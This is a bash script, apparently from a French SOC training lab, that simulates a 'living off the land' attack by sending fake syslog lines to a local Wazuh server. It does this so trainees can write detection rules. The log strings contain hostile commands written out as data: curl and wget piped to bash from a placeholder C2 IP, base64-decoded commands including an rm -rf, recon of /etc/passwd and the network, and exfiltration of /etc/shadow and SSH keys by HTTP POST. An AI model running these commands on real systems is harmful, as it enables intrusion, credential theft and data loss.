#!/bin/bash

# ============================================================
#  SIMULATION — Living off the Land (Niveau 3)
#  MITRE ATT&CK : T1059.004 (Unix Shell), T1140 (Deobfuscation)
# ============================================================
#
#  Utilisation d'outils légitimes (curl, wget, base64, bash)
#  à des fins malveillantes. Difficile à détecter car les
#  binaires sont légitimes — seul le contexte est suspect.
# ============================================================

WAZUH_IP="127.0.0.1"
SYSLOG_PORT="514"
HOSTNAME="apt-host-42"
C2_IP="185.220.101.45"  # IP externe fictive

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo ""
echo "============================================================"
echo -e "  ${RED}[SIMULATION] Living off the Land — Niveau 3${NC}"
echo "============================================================"
echo ""
echo -e "  ${YELLOW}MITRE${NC} : T1059.004 + T1140"
echo -e "  ${YELLOW}Host${NC}  : $HOSTNAME"
echo ""

DATE=$(date '+%b %d %H:%M:%S')

send_syslog() {
    printf "<38>%s %s %s\n" "$DATE" "$HOSTNAME" "$1" | nc -u -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null || \
    printf "<38>%s %s %s\n" "$DATE" "$HOSTNAME" "$1" | nc -w1 "$WAZUH_IP" "$SYSLOG_PORT" 2>/dev/null
}

echo -e "${CYAN}[*] Phase 1 — Download via curl (payload obfusqué)...${NC}"
send_syslog "bash[3001]: curl -s -L http://$C2_IP/update.sh | bash"
send_syslog "bash[3002]: wget -qO- http://$C2_IP/stage2.bin > /tmp/.s2 && chmod +x /tmp/.s2 && /tmp/.s2"
sleep 0.5

echo -e "${CYAN}[*] Phase 2 — Décodage base64 (obfuscation)...${NC}"
send_syslog "bash[3003]: echo 'aW5zdGFsbCBiYWNrZG9vcgo=' | base64 -d | bash"
send_syslog "bash[3004]: python3 -c 'import base64,subprocess;subprocess.call(base64.b64decode(\"cm0gLXJmIC90bXAvLioK\"))'"
sleep 0.5

echo -e "${CYAN}[*] Phase 3 — Reconnaissance interne...${NC}"
send_syslog "bash[3005]: cat /etc/passwd | awk -F: '\$3 >= 1000 {print \$1}'"
send_syslog "bash[3006]: for h in 10.0.0.{1..254}; do ping -c1 -W1 \$h &>/dev/null && echo \$h; done"
send_syslog "bash[3007]: ss -tlnp | grep -E '22|3306|5432|27017'"
sleep 0.5

echo -e "${CYAN}[*] Phase 4 — Exfiltration via HTTP POST...${NC}"
send_syslog "bash[3008]: curl -X POST -d @/etc/shadow http://$C2_IP/collect"
send_syslog "bash[3009]: tar czf - /home/jdupont/.ssh /home/jdupont/documents | curl -X POST --data-binary @- http://$C2_IP/upload"
sleep 0.3

echo ""
echo "============================================================"
echo -e "  ${GREEN}Simulation terminée${NC}"
echo "============================================================"
echo ""
echo "  Dans Wazuh → Threat Hunting :"
echo ""
echo -e "  ${CYAN}1. Ces actions NE déclenchent PAS les règles par défaut.${NC}"
echo "     C'est un appel shell — aucun malware, que des binaires légitimes."
echo ""
echo -e "  ${CYAN}2. Pour les détecter, tu dois créer des règles custom :${NC}"
echo "     → Détecter curl/wget vers des IPs externes non habituelles"
echo "     → Détecter l'utilisation de base64 -d avec pipe vers bash"
echo "     → Détecter les accès à /etc/shadow"
echo "     Défi : écrire ces règles dans local_rules.xml"
echo ""
echo -e "  ${CYAN}3. IP C2 externe : ${RED}$C2_IP${NC}"
echo ""
